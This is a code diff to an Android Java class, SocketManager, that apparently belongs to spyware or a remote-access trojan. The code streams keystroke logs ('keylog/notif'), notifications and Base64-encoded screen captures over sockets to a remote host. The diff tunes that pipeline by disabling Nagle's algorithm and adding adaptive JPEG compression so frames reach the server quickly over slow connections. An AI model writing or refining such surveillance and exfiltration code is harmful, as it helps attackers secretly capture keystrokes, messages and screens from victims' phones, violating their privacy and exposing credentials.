@@ -186,6 +186,7 @@ public class SocketManager {
                 Log.i(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                 tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 tcpSocket.setKeepAlive(true);
+                tcpSocket.setTcpNoDelay(true);      // disable Nagle — send each packet immediately
                 tcpSocket.setSoTimeout(0);          // no read timeout — server sends pings
 
                 out       = new PrintWriter(tcpSocket.getOutputStream(), true);
@@ -232,6 +233,7 @@ public class SocketManager {
             try {
                 streamSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 streamSocket.setKeepAlive(true);
+                streamSocket.setTcpNoDelay(true);   // disable Nagle — send frames immediately
                 streamSocket.setSoTimeout(0);
                 streamOut = new PrintWriter(streamSocket.getOutputStream(), true);
                 streamConnected = true;
@@ -322,6 +324,7 @@ public class SocketManager {
             try {
                 liveSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 liveSocket.setKeepAlive(true);
+                liveSocket.setTcpNoDelay(true);     // disable Nagle — keylog/notif sent immediately
                 liveSocket.setSoTimeout(0);
                 liveOut = new PrintWriter(liveSocket.getOutputStream(), true);
                 liveConnected = true;
@@ -948,8 +951,9 @@ public class SocketManager {
                     // Scale to max 720 px wide — readable resolution, efficient transfer
                     Bitmap scaled = scaleBitmapToWidth(frame, 720);
                     if (scaled != frame) frame.recycle();
-                    // Quality 65 — clear and readable while keeping image size light
-                    String b64 = bitmapToBase64(scaled, 65);
+                    // Adaptive quality: starts at 65%, steps down if frame exceeds 100 KB
+                    // so slow-bandwidth connections never get stalled by one large frame
+                    String b64 = bitmapToBase64Adaptive(scaled, 65, 100_000);
                     scaled.recycle();
                     if (b64 != null) {
                         JSONObject d = new JSONObject();
@@ -1053,6 +1057,35 @@ public class SocketManager {
             Log.e(TAG, "bitmapToBase64 error: " + e.getMessage());
             return null;
         }
+    }
+
+    /**
+     * Encode bitmap to Base64 JPEG within a max byte budget.
+     * Starts at the given quality and steps down until the result fits,
+     * ensuring large frames don't stall slow connections.
+     *
+     * @param bitmap     source bitmap
+     * @param quality    starting JPEG quality (0-100)
+     * @param maxBytes   max allowed Base64 string bytes (~100 KB default)
+     */
+    private String bitmapToBase64Adaptive(Bitmap bitmap, int quality, int maxBytes) {
+        try {
+            int q = quality;
+            while (q >= 20) {
+                ByteArrayOutputStream out = new ByteArrayOutputStream();
+                bitmap.compress(Bitmap.CompressFormat.JPEG, q, out);
+                byte[] bytes = out.toByteArray();
+                String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                if (b64.length() <= maxBytes || q <= 20) {
+                    if (q < quality) Log.d(TAG, "Adaptive quality reduced to " + q + "% (" + b64.length() + " bytes)");
+                    return b64;
+                }
+                q -= 10; // step down and try again
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "bitmapToBase64Adaptive error: " + e.getMessage());
+        }
+        return null;
     }
 
     private boolean isAccessibilityCommand(String command) {
